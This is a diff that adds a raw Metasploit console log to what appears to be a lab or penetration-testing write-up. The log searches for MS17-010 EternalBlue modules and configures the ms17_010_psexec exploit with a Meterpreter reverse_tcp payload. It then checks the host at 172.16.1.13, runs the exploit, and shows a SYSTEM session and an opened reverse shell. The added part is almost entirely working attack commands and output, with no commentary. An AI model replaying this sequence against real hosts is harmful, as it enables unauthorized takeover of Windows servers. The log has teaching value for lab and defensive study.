@@ -552,3 +552,176 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 28.84 seconds
 
 ```
+
+```
+msf6 > search ms17-010
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank     Check  Description
+   -  ----                                      ---------------  ----     -----  -----------
+   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+
+
+Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > use 1
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_psexec) > 
+msf6 exploit(windows/smb/ms17_010_psexec) > options
+
+Module options (exploit/windows/smb/ms17_010_psexec):
+
+   Name                  Current Setting                      Required  Description
+   ----                  ---------------                      --------  -----------
+   DBGTRACE              false                                yes       Show extra debug trace info
+   LEAKATTEMPTS          99                                   yes       How many times to try to leak transaction
+   NAMEDPIPE                                                  no        A named pipe that can be connected to (leave blank for auto)
+   NAMED_PIPES           /usr/share/metasploit-framework/dat  yes       List of named pipes to check
+                         a/wordlists/named_pipes.txt
+   RHOSTS                                                     yes       The target host(s), range CIDR identifier, or hosts file with sy
+                                                                        ntax 'file:<path>'
+   RPORT                 445                                  yes       The Target port (TCP)
+   SERVICE_DESCRIPTION                                        no        Service description to to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                                       no        The service display name
+   SERVICE_NAME                                               no        The service name
+   SHARE                 ADMIN$                               yes       The share to connect to, can be an admin share (ADMIN$,C$,...) o
+                                                                        r a normal read/write folder share
+   SMBDomain             .                                    no        The Windows domain to use for authentication
+   SMBPass                                                    no        The password for the specified username
+   SMBUser                                                    no        The username to authenticate as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.129.204.126   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(windows/smb/ms17_010_psexec) > set rhosts 172.16.1.13
+rhost => 172.16.1.13
+msf6 exploit(windows/smb/ms17_010_psexec) > setg lhost ens224
+lhost => ens224
+msf6 exploit(windows/smb/ms17_010_psexec) > 
+msf6 exploit(windows/smb/ms17_010_psexec) > options
+
+Module options (exploit/windows/smb/ms17_010_psexec):
+
+   Name                  Current Setting                      Required  Description
+   ----                  ---------------                      --------  -----------
+   DBGTRACE              false                                yes       Show extra debug trace info
+   LEAKATTEMPTS          99                                   yes       How many times to try to leak transaction
+   NAMEDPIPE                                                  no        A named pipe that can be connected to (leave blank for auto)
+   NAMED_PIPES           /usr/share/metasploit-framework/dat  yes       List of named pipes to check
+                         a/wordlists/named_pipes.txt
+   RHOSTS                                                     yes       The target host(s), range CIDR identifier, or hosts file with sy
+                                                                        ntax 'file:<path>'
+   RPORT                 445                                  yes       The Target port (TCP)
+   SERVICE_DESCRIPTION                                        no        Service description to to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                                       no        The service display name
+   SERVICE_NAME                                               no        The service name
+   SHARE                 ADMIN$                               yes       The share to connect to, can be an admin share (ADMIN$,C$,...) o
+                                                                        r a normal read/write folder share
+   SMBDomain             .                                    no        The Windows domain to use for authentication
+   SMBPass                                                    no        The password for the specified username
+   SMBUser                                                    no        The username to authenticate as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.129.204.126   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(windows/smb/ms17_010_psexec) > set lhost ens224
+lhost => ens224
+msf6 exploit(windows/smb/ms17_010_psexec) > set rhosts 172.16.1.13
+rhosts => 172.16.1.13
+msf6 exploit(windows/smb/ms17_010_psexec) > 
+msf6 exploit(windows/smb/ms17_010_psexec) > options
+
+Module options (exploit/windows/smb/ms17_010_psexec):
+
+   Name                  Current Setting                      Required  Description
+   ----                  ---------------                      --------  -----------
+   DBGTRACE              false                                yes       Show extra debug trace info
+   LEAKATTEMPTS          99                                   yes       How many times to try to leak transaction
+   NAMEDPIPE                                                  no        A named pipe that can be connected to (leave blank for auto)
+   NAMED_PIPES           /usr/share/metasploit-framework/dat  yes       List of named pipes to check
+                         a/wordlists/named_pipes.txt
+   RHOSTS                172.16.1.13                          yes       The target host(s), range CIDR identifier, or hosts file with sy
+                                                                        ntax 'file:<path>'
+   RPORT                 445                                  yes       The Target port (TCP)
+   SERVICE_DESCRIPTION                                        no        Service description to to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                                       no        The service display name
+   SERVICE_NAME                                               no        The service name
+   SHARE                 ADMIN$                               yes       The share to connect to, can be an admin share (ADMIN$,C$,...) o
+                                                                        r a normal read/write folder share
+   SMBDomain             .                                    no        The Windows domain to use for authentication
+   SMBPass                                                    no        The password for the specified username
+   SMBUser                                                    no        The username to authenticate as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     ens224           yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(windows/smb/ms17_010_psexec) > 
+
+msf6 exploit(windows/smb/ms17_010_psexec) > check
+
+[*] 172.16.1.13:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 172.16.1.13:445       - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
+[*] 172.16.1.13:445       - Scanned 1 of 1 hosts (100% complete)
+[+] 172.16.1.13:445 - The target is vulnerable.
+msf6 exploit(windows/smb/ms17_010_psexec) > run
+
+[*] Started reverse TCP handler on 172.16.1.5:4444 
+[*] 172.16.1.13:445 - Target OS: Windows Server 2016 Standard 14393
+[*] 172.16.1.13:445 - Built a write-what-where primitive...
+[+] 172.16.1.13:445 - Overwrite complete... SYSTEM session obtained!
+[*] 172.16.1.13:445 - Selecting PowerShell target
+[*] 172.16.1.13:445 - Executing the payload...
+[+] 172.16.1.13:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (175174 bytes) to 172.16.1.13
+[*] Meterpreter session 1 opened (172.16.1.5:4444 -> 172.16.1.13:49671) at 2024-05-10 16:14:50 -0400
+
+
+```
